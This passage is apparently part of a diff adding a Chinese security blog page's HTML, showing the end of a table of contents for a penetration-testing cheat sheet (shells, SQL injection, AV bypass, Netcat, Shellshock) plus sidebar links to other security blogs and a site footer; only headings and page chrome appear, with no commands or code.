class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#连接shell"><span class="toc-text">连接shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#注入"><span class="toc-text">注入</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SQLMap"><span class="toc-text">SQLMap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#其他"><span class="toc-text">其他</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#隧道"><span class="toc-text">隧道</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#AV-Bypass"><span class="toc-text">AV Bypass</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Web主机（传输文件）"><span class="toc-text">Web主机（传输文件）</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#PHP-msf-shell"><span class="toc-text">PHP msf shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Netcat-1"><span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#使用解释器反弹shell"><span class="toc-text">使用解释器反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Shellshock"><span class="toc-text">Shellshock</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接</p></div>
+      <ul>
+        
+        <li><i class="fas fa-envelope"></i><a href="mailto:a3VpYmFoZEBmb3htYWlsLmNvbQ" target="_blank">E-Mail</a></li>
+        
+        <li><i class="fab fa-github"></i><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><i class="fab fa-weibo"></i><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>大佬们的博客</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.ggsec.cn/" target="_blank">Demon</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://payloads.online/" target="_blank">倾旋</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://wbglil.github.io/" target="_blank">WBGlIl(装小白的巨佬)</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.sariel.top/" target="_blank">只因不值得</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://uknowsec.cn/" target="_blank">Uknowse</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://422926799.github.io/" target="_blank">九世</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://yulige.top/" target="_blank">郁离歌</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://phpinfo.me/" target="_blank">Lcy</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://867810770.github.io/" target="_blank">修心</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://vinc.top/" target="_blank">Vimc</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://qimingyu.com/" target="_blank">qimingyu</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://x.hacking8.com/" target="_blank">小草窝</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://yiwlny.github.io/" target="_blank">Rogerd</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://loulan-ling.github.io/" target="_blank">楼兰-翎师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://manmachines.github.io/" target="_blank">菜师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://whale3070.github.io/" target="_blank">whale3070</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.cnblogs.com/Secde0/" target="_blank">Secde0</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Kuiba</span><span class="year"><i class="far fa-copyright"></i>2018 - 2021</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">BY-NC-SA 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          本站托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
